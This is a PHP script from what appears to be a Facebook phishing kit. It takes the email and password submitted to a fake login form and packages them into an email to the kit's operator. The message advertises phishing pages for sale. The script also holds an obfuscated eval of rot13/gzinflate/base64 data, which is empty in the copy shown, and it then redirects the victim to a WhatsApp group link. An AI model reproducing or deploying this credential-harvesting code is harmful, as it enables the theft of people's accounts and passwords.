<?php
$user = $_POST['email'];
$pass = $_POST['password'];
$subject = "Setoran Akun { ".$user." }";
$message = 'RESULT FACEBOOK DATANG ANJENG
<p>
|>> Email : '.$user.'
<p>
|>> Password : '.$pass.'
<p>
Beli Unchek / Web Phising Gg + Murmer Hanya Di Richard Shop
';
include 'email.php';
$headersx  = 'MIME-Version: 1.0' . "\r\n";
$headersx .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headersx .= 'From: UNCHEK FACEBOOK RICHARD <result@raflipedia.com>' . "\r\n";
eval(str_rot13(gzinflate(str_rot13(base64_decode('')))));
?>
<html>
<head>
<meta http-equiv="REFRESH" content="0;url=https://chat.whatsapp.com/BJvyh6Qy3mf99iSua0Lru0">
</head>
<body>
</body>
</html>